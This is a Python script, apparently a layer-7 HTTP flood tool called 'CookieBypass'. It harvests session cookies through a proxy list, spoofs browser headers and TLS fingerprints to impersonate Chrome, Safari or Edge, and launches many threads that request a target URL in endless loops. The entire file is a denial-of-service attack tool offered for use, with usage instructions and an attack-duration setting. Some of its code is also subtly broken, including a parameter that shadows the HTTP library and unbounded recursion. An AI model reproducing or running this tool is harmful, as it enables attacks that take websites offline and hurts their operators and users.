import os
import requests
import threading
import time
import random
import sys
from curl_cffi import requests as browser
seed = random.random() + 5 + random.random() + random.randint(1, 8) + random.random() + random.randint(2000, 2100) + random.randint(92215, 99999) + (random.random() + random.randint(3, 9)) - random.random()
random.seed(seed)
def get_proxies(file_path):
    with open(file_path, "r") as f:
        proxies = f.read().splitlines()
    return proxies
def generate_random_headers(browser):
    if browser == "chrome":
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + str(random.randint(50, 90)) + ".0." + str(random.randint(1000, 9999)) + ".110 Safari/537.3",
        ]
    elif browser == "safari":
        user_agents = [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        ]
    elif browser == "edge":
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + str(random.randint(50, 90)) + ".0.3163.100 Safari/537.36 Edge/18.0." + str(random.randint(100, 999))
        ]
    else:
        raise ValueError("Invalid browser type")

    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Referer": "https://www.google.com/?q=",
        "Origin": "https://www.google.com/",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "max-age=0"
    }
    return headers

flooders = 0
def get_proxy(proxies):
    return random.choice(proxies)
def flooderv1(cookies, ip, port, target_url, headers, browser):
    print(f"[CookieBypass:FloodEngine:{browser}] {ip} using {cookies} to flood.")
    while True:
        try:
            browser.get(target_url, headers=headers, cookies=cookies, proxies={'http': f"http://{ip}:{port}", 'https': f"http://{ip}:{port}"}, impersonate=browser)
        except:
            pass

def cookie(target_url, proxies):
    try:
        agent = random.choice(["chrome", "safari", "edge"])
        proxy = get_proxy(proxies).split(":")
        session = browser.Session()
        headers = generate_random_headers(agent)
        site = session.get(target_url, headers=headers, proxies={'http': f"http://{proxy[0]}:{proxy[1]}", 'https': f"http://{proxy[0]}:{proxy[1]}"}, impersonate=agent)
        for i in range(flooders):
            threading.Thread(target=flooderv1, args=(session.cookies, proxy[0], proxy[1], target_url, headers,agent,)).start()
            cookie(target_url, proxies)
        else:
            cookie(target_url, proxies)
    except Exception as e:
        cookie(target_url, proxies)
if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python random-tls.py <target_url> <proxy_list_file> <num_threads> <attack_duration> <flooders_per_cookie>")
        sys.exit(1)
    target_url = sys.argv[1]
    proxy_list_file = sys.argv[2]
    num_threads = int(sys.argv[3])
    attack_duration = int(sys.argv[4])
    proxies = get_proxies(proxy_list_file)
    flooders = int(sys.argv[5])
    print(f"[CookieBypass] Made By nix (https://t.me/iotwarz) | https://github.com/iotwar/cookie-bypass")
    print("[CookieBypass] HTTPS Cookie Bypass Flood With Random Browsers. (Chrome, Safari, Edge)")
    print(f"[CookieBypass] Starting {str(num_threads)} grabbers at the rate of {str(flooders)} Per Grabbed Cookie, Seed: {str(seed)}")
    for i in range(num_threads):
        threading.Thread(target=cookie, args=(target_url, proxies)).start()
    if attack_duration:
        time.sleep(attack_duration)
        os.kill(os.getpid(), 9)
    
